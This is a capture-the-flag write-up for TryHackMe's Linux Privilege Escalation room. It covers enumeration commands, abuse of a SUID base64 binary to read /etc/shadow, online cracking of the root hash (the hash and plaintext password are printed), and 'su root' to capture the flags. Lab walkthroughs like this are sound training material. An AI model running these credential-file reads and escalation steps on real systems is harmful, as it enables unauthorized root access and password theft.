**TryHackMe Write-Up: Linux Privilege Escalation**

You can access the room [here](https://tryhackme.com/room/linprivesc) on TryHackMe.

* **Target IP:** `10.10.55.87`
* **VPN:** Connected to TryHackMe using OpenVPN.
* **Initial Access:** Connected to the target VM via SSH using the following credentials:

  * **Username:** `leonard`
  * **Password:** `Penny123`

---

### 🧭 Enumeration

1. **Checked user privileges:**

   ```bash
   id
   ```

2. **Identified the hostname:**

   ```bash
   hostname
   ```

3. **Checked the kernel version:**

   ```bash
   uname -r
   ```

   * Kernel version: `3.10.0-1160.el7.x86_64`

4. **Checked for sudo privileges:**

   ```bash
   sudo -l
   ```

5. **Searched for interesting files (e.g., passwords, SSH keys):**

   ```bash
   find / -type f \( -name "*pass*" -o -name "*ssh*" \) 2>/dev/null
   ```

   * Nothing useful found.

6. **Searched online for kernel-specific vulnerabilities:**

   * No exploitable vulnerabilities found for this kernel version.

7. **Checked for files with SUID permissions:**

   ```bash
   find / -type f -perm -04000 -ls 2>/dev/null
   ```

   * Found several SUID binaries.
   * Notably, `base64` had the SUID bit set.

---

### 🛠 Exploitation via SUID `base64`

Using GTFOBins[here](https://gtfobins.github.io/#), I discovered that the `base64` command can be abused to read files as another user when SUID is set.

* Read `/etc/shadow` using:

  ```bash
  base64 /etc/shadow | base64 --decode
  ```

* Extracted the root user's password hash from the file.

* Cracked the hash using [hashes.com](https://hashes.com), which revealed the root password.

`$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51:softkittywarmkitty`

---

### 🔐 Privilege Escalation

* Switched to the root user:

  ```bash
  su root
  ```

  * Entered the cracked password and successfully gained root access.

---

### 🏁 Flags

* Retrieved both `flag1` and `flag2` from the `missy` and `root` directories, respectively.

---

**Status:** ✅ Root access achieved and both flags captured.

Thanks!

